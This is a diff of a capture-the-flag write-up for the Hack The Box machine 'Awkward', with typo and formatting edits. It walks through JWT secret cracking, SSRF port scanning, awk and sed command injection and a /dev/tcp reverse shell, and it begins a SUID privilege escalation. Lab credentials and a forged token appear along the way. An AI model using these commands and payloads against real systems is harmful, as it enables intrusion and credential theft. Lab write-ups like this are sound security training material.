@@ -42,7 +42,7 @@ Content-Length: 132
 ```
 
 So we're starting vhost enumeration in the background.  
-looking at the website in the browser, I don't think it does anything over interest, except telling us that they have an online store in construction, and giving us employee names.
+looking at the website in the browser, I don't think it does anything of interest, except telling us that they have an online store in construction, and giving us employee names.
 ```bash
 Christine Wool - CEO
 Bean Hill - Sysadmin
@@ -348,8 +348,10 @@ export default {
 
 So we can start hitting that endpoint to see what happens:  
 apparently the api endpoint itself doesn't even need any kind of auth
-```
+```bash
 curl -s "http://hat-valley.htb/api/staff-details" | jq .
+```
+```json
 [
   {
     "user_id": 1,
@@ -392,7 +394,7 @@ christopher.jones:chris123
 ```
 
 So now we can log in to the app as Christopher and we get a valid signed jwt as him.  
-```
+```python
 import sys
 from jwt.utils import base64url_decode
 from binascii import hexlify
@@ -422,7 +424,7 @@ if __name__ == "__main__":
 
 
 We can use this jwt2john script to crack the password that this jwt was signed with
-```
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt chris-jwt.txt
 john hash.txt --show --format=Raw-SHA256
 ?:123beany123
@@ -432,8 +434,8 @@ john hash.txt --show --format=Raw-SHA256
 
 Tried to log in with those creds to the main app, the store app on the vhost, and over ssh, no success so far.
 
-Presumably the store is up thing, reaches the store through the internal network to check if it's up. So maybe we can leverage this as an SSRF, looking at the source in webpack again:
-```
+Presumably the store is up thing reaches the store through the internal network to check if it's up. So maybe we can leverage this as an SSRF, looking at the source in webpack again:
+```js
 import axios from 'axios'
 axios.defaults.withCredentials = true
 const baseURL = "/api/"
@@ -451,7 +453,7 @@ export default {
 ```
 
 And indeed this can be used as a SSRF:
-```
+```bash
 curl -i 'http://hat-valley.htb/api/store-status?url="http://127.0.0.1"'
 HTTP/1.1 200 OK
 Server: nginx/1.18.0 (Ubuntu)
@@ -474,7 +476,7 @@ etag: W/"84-P/5ob00JvOzx20G7pf2GChzepTg"
 ```
 
 So we can leverage this to fuzz for open ports from behind the firewall
-```
+```bash
 ffuf \
   -w /usr/share/seclists/Discovery/Web-Content/local-ports.txt \
   -u 'http://hat-valley.htb/api/store-status?url="http://FUZZ"' \
@@ -508,9 +510,9 @@ ________________________________________________
 127.0.0.1:8080          [Status: 200, Size: 2881, Words: 305, Lines: 55, Duration: 252ms]
 ```
 
-8080 doesn't seem very interesting, and I'm not entirely sure what it is but 3002 is some kind of documentatino page, and it gives us the server side js code for the features we saw from the client side so far.
+8080 doesn't seem very interesting, and I'm not entirely sure what it is but 3002 is some kind of documentation page, and it gives us the server side js code for the features we saw from the client side so far.
 
-In submit-leave feature's code, the const finalEntry is passed to an exec() and we controll the variables that it's made of, and it's then expanded into a system command with echo
+In submit-leave feature's code, the const finalEntry is passed to an exec() and we control the variables that it's made of, and it's then expanded into a system command with echo
 
 In all-leave same concept but potentially more interesting because that's an awk command, and awk is a GTFO bin, and the way the command is constructed seems pretty close to an awk command we could use for arbitrary file read, see the js:
 ```js
@@ -558,7 +560,7 @@ awk '//' /etc/passwd
 ``` 
 
 So the following could work I think:
-``` 
+```js
 const user == "/' /etc/passwd '"
 exec("awk '/" + user + "/' /var/www/private/leave_requests.csv", {encoding: 'binary', maxBuffer: 51200000}, (error, stdout, stderr) => {
     if(stdout) {
@@ -578,7 +580,7 @@ We can do this because we control the user variable since we know the secret to 
 ![jwt-sign.png](jwt-sign.png)  
 
 which means that we now have LFI on the box
-```
+```bash
 curl -i 'http://hat-valley.htb/api/all-leave' -b 'token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2NzM3MjAyNTd9.hMapu1pjAQ31z6-DnWiUe42dU5LhfxrafWVcNyoZYps'
 HTTP/1.1 200 OK
 Server: nginx/1.18.0 (Ubuntu)
@@ -645,7 +647,7 @@ _laurel:x:999:999::/var/log/laurel:/bin/false
 ```
 
 we know bean is the admin and christine the ceo
-```
+```bash
 grep sh$ passwd
 root:x:0:0:root:/root:/bin/bash
 bean:x:1001:1001:,,,:/home/bean:/bin/bash
@@ -653,15 +655,15 @@ christine:x:1002:1002:,,,:/home/christine:/bin/bash
 ```
 
 Naturaly we can try to pull the ssh private keys for those 2, but no luck.  
-reading a buch of the usual files, we end up reading the bashrc. 
-there's a command alias for a backup script:
-```
+reading a bunch of the usual files, we end up reading the bashrc.   
+There's a command alias for a backup script:
+```bash
 # custom
 alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'
 ```
 
 So we're pulling that out:
-```
+```bash
 #!/bin/bash
 mkdir /home/bean/Documents/backup_tmp
 cd /home/bean
@@ -672,9 +674,12 @@ tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
 rm -r /home/bean/Documents/backup_tmp
 ```
 
-So now we know where to pull that backup from. So after extracting the archive we can start looting around in the home folder of bean.  
-Xpad sounds like it could be some kind of a notepad app, and it is indeed.
-```
+Now we know where to pull that backup from.  
+So after extracting the archive we can start looting around in the home folder of bean.  
+Xpad sounds like it could be some kind of a notepad app, and it is indeed.  
+Looks like bean also used that password for his user account on the box. 
+Which means we get a shell over ssh.
+```bash
 pwd
 /home/blnkn/sec/htb/machines/awkward/loot/bean/.config/xpad
 cat content-DS1ZS1
@@ -703,12 +708,12 @@ admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1
 ```
 According to [Apache's docs](https://httpd.apache.org/docs/current/misc/password_encryptions.html) this may not be easily crackable.
 
-but from the readme file bean seems to say that it's his password for the store app, he didn't lie this combo works on the store webapp:
+But in the readme file Bean seems to say that it's his password for the store app, he didn't lie this combo works on the store webapp:
 ```
 admin:014mrbeanrules!#P
 ```
 
-bean also has access to the source code for that store web app, so after reading through this and playing with the webapp, the code to delete from cart seems vulnerable to command injection again:
+Bean also has access to the source code for that store web app, so after reading through this and playing with the webapp, the code to delete from cart seems vulnerable to command injection again:
 ```php
 //delete from cart
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' && $_POST['item'] && $_POST['user']) {
@@ -740,7 +745,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['action'] === 'delete_item' 
 ```
 
 Because it uses sed, sed is a GTFO bin and we control some variables in that expression, we could drop a very simple revshell in /tmp
-```
+```bash
 -bash-5.1$ vi blah.sh
 -bash-5.1$ chmod +x blah.sh
 -bash-5.1$ cat blah.sh
@@ -749,7 +754,7 @@ sh -i >& /dev/tcp/10.10.14.135/4242 0>&1
 ```
 
 And then have sed call it with something like that
-```
+```bash
 sed '1e/tmp/blah.sh' /etc/passwd
 sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}
 sed -i '/item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '/d' /var/www/store/cart/user_id
@@ -758,7 +763,7 @@ sed -i '/item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '/d' /var/www/store/cart/us
 so this means that the `item_id` needs to be `1' -e "1e/tmp/blah.sh" /tmp/blah.sh '` lets go put whatever in the cart and intercept the post to remove it, and we can slap our payload in there with some urlencoding:  
 ![delete.png](delete.png)
 
-and ... disapointingly we get an `Invalid item` error, but that's not a big deal we have the source, lets have a closer look.
+And ... disapointingly we get an `Invalid item` error, but that's not a big deal we have the source, lets have a closer look.
 ```php
     if(checkValidItem("{$STORE_HOME}cart/{$user_id}")) {
         system("sed -i '/item_id={$item_id}/d' {$STORE_HOME}cart/{$user_id}");
@@ -805,15 +810,15 @@ item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '&item_name=Straw Hat&item_brand=Sun
 Now we can intercept a cart add and substitute the real item id with our newly created file number, 4 in this case  
 ![sketchy.png](sketchy.png)  
 
-And now the stuff is in there:
-```
+Now the correct item id has been copied to our user's cart
+```bash
 -bash-5.1$ cat    5ce3-9484-af5-1edd
 ***Hat Valley Cart***
 item_id=1&item_name=Yellow Beanie&item_brand=Good Doggo&item_price=$39.90
 item_id=1' -e "1e/tmp/blah.sh" /tmp/blah.sh '&item_name=Straw Hat&item_brand=Sunny Summer&item_price=$70.00
 ```
 
-let's not forget to have a listener to catch that shell and lets try the delete again.
+Let's not forget to have a listener to catch that shell and lets try the delete again.
 ```bash
 rlwrap nc -lvnp 4242
 listening on [any] 4242 ...
@@ -826,7 +831,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $
 ```
 
-now we have a shell as www-data so we can access that /var/www/private folder taht wasn't readable by bean
+Now we have a shell as www-data so we can access that /var/www/private folder that wasn't readable by bean
 ```bash
 $ pwd
 /var/www/store
@@ -897,7 +902,7 @@ and we see this happening in pspy
 2023/01/16 04:43:15 CMD: UID=0    PID=3636   | local -t unix
 ```
 
-let's try to use the mail GTFO to set bash to SUID, for that we'll start by dropping a SUID script in /tmp
+Let's try to use the mail GTFO to set bash to SUID, for that we'll start by dropping a SUID script in /tmp
 ```bash
 $ cat << EOF > asd
 > #!/bin/bash
